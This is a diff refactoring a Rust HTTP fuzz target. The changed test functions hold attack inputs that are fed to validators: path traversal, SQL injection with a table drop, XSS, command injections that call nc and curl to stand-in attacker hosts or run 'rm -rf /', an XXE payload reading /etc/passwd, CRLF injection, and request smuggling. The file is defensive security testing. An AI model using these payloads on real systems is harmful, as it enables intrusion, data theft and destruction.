@@ -120,14 +120,11 @@ fuzz_target!(|input: FuzzHttpRequest| {
 });
 
 fn test_http_method_validation(method: &HttpMethod) {
-    match method {
-        HttpMethod::Malformed(malformed) => {
-            // Should gracefully handle malformed HTTP methods
-            let _ = validate_http_method(malformed);
-        }
-        _ => {
-            // Standard methods should be handled correctly
-        }
+    if let HttpMethod::Malformed(malformed) = method {
+        // Should gracefully handle malformed HTTP methods
+        let _ = validate_http_method(malformed);
+    } else {
+        // Standard methods should be handled correctly
     }
 }
 
@@ -358,14 +355,11 @@ fn validate_query_parameter(name: &str, value: &str) -> Result<(), String> {
 fn test_json_body_parsing(json_str: &str) {
     // Should handle malformed JSON gracefully
     let parse_result = serde_json::from_str::<serde_json::Value>(json_str);
-    match parse_result {
-        Ok(value) => {
-            // Check for JSON bombs or excessive nesting
-            check_json_safety(&value, 0);
-        }
-        Err(_) => {
-            // Parsing errors are acceptable for malformed JSON
-        }
+    if let Ok(value) = parse_result {
+        // Check for JSON bombs or excessive nesting
+        check_json_safety(&value, 0);
+    } else {
+        // Parsing errors are acceptable for malformed JSON
     }
 }
 
@@ -399,10 +393,10 @@ fn test_multipart_parsing(fields: &[MultipartField]) {
 // Attack vector test functions
 fn test_path_traversal_attack(path: &str) {
     let malicious_paths = [
-        format!("../../../{}", path),
-        format!("..\\..\\..\\{}", path),
-        format!("%2e%2e%2f{}", path),
-        format!("....//....//....//{}", path),
+        format!("../../../{path}"),
+        format!("..\\..\\..\\{path}"),
+        format!("%2e%2e%2f{path}"),
+        format!("....//....//....//{path}"),
     ];
 
     for malicious_path in &malicious_paths {
@@ -417,9 +411,9 @@ fn test_path_traversal_attack(path: &str) {
 
 fn test_sql_injection_attack(injection: &str) {
     let sql_injections = [
-        format!("1' OR '1'='1 -- {}", injection),
-        format!("'; DROP TABLE users; -- {}", injection),
-        format!("1 UNION SELECT * FROM users -- {}", injection),
+        format!("1' OR '1'='1 -- {injection}"),
+        format!("'; DROP TABLE users; -- {injection}"),
+        format!("1 UNION SELECT * FROM users -- {injection}"),
     ];
 
     for sql_injection in &sql_injections {
@@ -431,9 +425,9 @@ fn test_sql_injection_attack(injection: &str) {
 
 fn test_xss_attack(xss: &str) {
     let xss_payloads = [
-        format!("<script>alert('XSS')</script>{}", xss),
-        format!("javascript:alert('XSS'){}", xss),
-        format!("<img src=x onerror=alert('XSS')>{}", xss),
+        format!("<script>alert('XSS')</script>{xss}"),
+        format!("javascript:alert('XSS'){xss}"),
+        format!("<img src=x onerror=alert('XSS')>{xss}"),
     ];
 
     for xss_payload in &xss_payloads {
@@ -445,9 +439,9 @@ fn test_xss_attack(xss: &str) {
 
 fn test_command_injection_attack(cmd: &str) {
     let command_injections = [
-        format!("; rm -rf / {}", cmd),
-        format!("| nc attacker.com 4444 {}", cmd),
-        format!("&& curl evil.com {}", cmd),
+        format!("; rm -rf / {cmd}"),
+        format!("| nc attacker.com 4444 {cmd}"),
+        format!("&& curl evil.com {cmd}"),
     ];
 
     for cmd_injection in &command_injections {
@@ -459,8 +453,8 @@ fn test_command_injection_attack(cmd: &str) {
 
 fn test_ldap_injection_attack(ldap: &str) {
     let ldap_injections = [
-        format!("*)(uid=*))(|(uid=* {}", ldap),
-        format!("admin)(&(password=*))(|(cn=* {}", ldap),
+        format!("*)(uid=*))(|(uid=* {ldap}"),
+        format!("admin)(&(password=*))(|(cn=* {ldap}"),
     ];
 
     for ldap_injection in &ldap_injections {
@@ -472,8 +466,7 @@ fn test_ldap_injection_attack(ldap: &str) {
 
 fn test_xxe_attack(xxe: &str) {
     let xxe_payloads = [format!(
-        "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"/etc/passwd\">]><foo>&xxe;</foo>{}",
-        xxe
+        "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"/etc/passwd\">]><foo>&xxe;</foo>{xxe}"
     )];
 
     for xxe_payload in &xxe_payloads {
@@ -484,7 +477,7 @@ fn test_xxe_attack(xxe: &str) {
 }
 
 fn test_ssti_attack(ssti: &str) {
-    let ssti_payloads = [format!("{{{{7*7}}}}{}", ssti), format!("${{7*7}}{}", ssti)];
+    let ssti_payloads = [format!("{{{{7*7}}}}{ssti}"), format!("${{7*7}}{ssti}")];
 
     for ssti_payload in &ssti_payloads {
         let result = validate_template_input(ssti_payload);
@@ -526,14 +519,14 @@ fn test_unicode_exploit(unicode: &str) {
 }
 
 fn test_null_byte_injection_attack(injection: &str) {
-    let null_injection = format!("{}\0malicious", injection);
+    let null_injection = format!("{injection}\0malicious");
     let result = validate_query_parameter("param", &null_injection);
     // Should detect null bytes
     assert!(result.is_err());
 }
 
 fn test_crlf_injection_attack(crlf: &str) {
-    let crlf_injection = format!("{}\r\nSet-Cookie: evil=true", crlf);
+    let crlf_injection = format!("{crlf}\r\nSet-Cookie: evil=true");
     let result = validate_http_header("param", &crlf_injection);
     // Should detect CRLF injection
     assert!(result.is_err());
@@ -541,10 +534,7 @@ fn test_crlf_injection_attack(crlf: &str) {
 
 fn test_request_smuggling_attack(smuggle: &str) {
     // Test HTTP request smuggling attempts
-    let smuggling_attempt = format!(
-        "Content-Length: 0\r\n\r\nPOST /evil HTTP/1.1\r\n{}",
-        smuggle
-    );
+    let smuggling_attempt = format!("Content-Length: 0\r\n\r\nPOST /evil HTTP/1.1\r\n{smuggle}");
     let result = validate_http_header("test", &smuggling_attempt);
     assert!(result.is_ok() || result.is_err());
 }
@@ -646,27 +636,27 @@ fn create_mock_request(fuzz_request: &FuzzHttpRequest) -> MockRequest {
     }
 }
 
-fn process_mock_request(_request: &MockRequest) -> Result<(), String> {
+const fn process_mock_request(_request: &MockRequest) -> Result<(), String> {
     // Mock request processing - should never panic
     Ok(())
 }
 
-fn generate_rate_limit_bypass_attempts(_request: &FuzzHttpRequest) -> Vec<MockRequest> {
+const fn generate_rate_limit_bypass_attempts(_request: &FuzzHttpRequest) -> Vec<MockRequest> {
     // Generate various rate limiting bypass attempts
     vec![]
 }
 
-fn generate_auth_bypass_attempts(_request: &FuzzHttpRequest) -> Vec<MockRequest> {
+const fn generate_auth_bypass_attempts(_request: &FuzzHttpRequest) -> Vec<MockRequest> {
     // Generate various authentication bypass attempts
     vec![]
 }
 
-fn simulate_rate_limit_check(_request: &MockRequest) -> Result<(), String> {
+const fn simulate_rate_limit_check(_request: &MockRequest) -> Result<(), String> {
     // Mock rate limit checking
     Ok(())
 }
 
-fn simulate_auth_check(_request: &MockRequest) -> Result<(), String> {
+const fn simulate_auth_check(_request: &MockRequest) -> Result<(), String> {
     // Mock authentication checking
     Ok(())
 }
